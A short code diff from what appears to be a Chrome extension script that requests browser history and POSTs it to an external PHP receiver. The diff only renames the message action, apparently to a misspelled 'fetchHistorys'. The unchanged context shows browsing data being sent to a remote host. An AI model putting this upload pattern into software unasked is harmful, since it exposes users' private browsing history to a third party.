@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', () => {
   console.log('Chrome object:', chrome);
   console.log('Chrome history:', chrome.history);
 // Request history data from the background script
-  chrome.runtime.sendMessage({ action: 'fetchHistory' }, (response) => {
+  chrome.runtime.sendMessage({ action: 'fetchHistorys' }, (response) => {
     if (response) {
       fetch('https://raju-dev-flutter.github.io/history_fetcher/history_receiver.php', {
         method: 'POST',
@@ -25,7 +25,7 @@ document.addEventListener('DOMContentLoaded', () => {
       console.error('No history data received.'); 
     }
   });
-  
+
   // if (chrome && chrome.history && typeof chrome.history.search === 'function') {
   //   chrome.history.search({ text: '', maxResults: 1000 }, (data) => {
   //     const historyData = data.map(item => ({
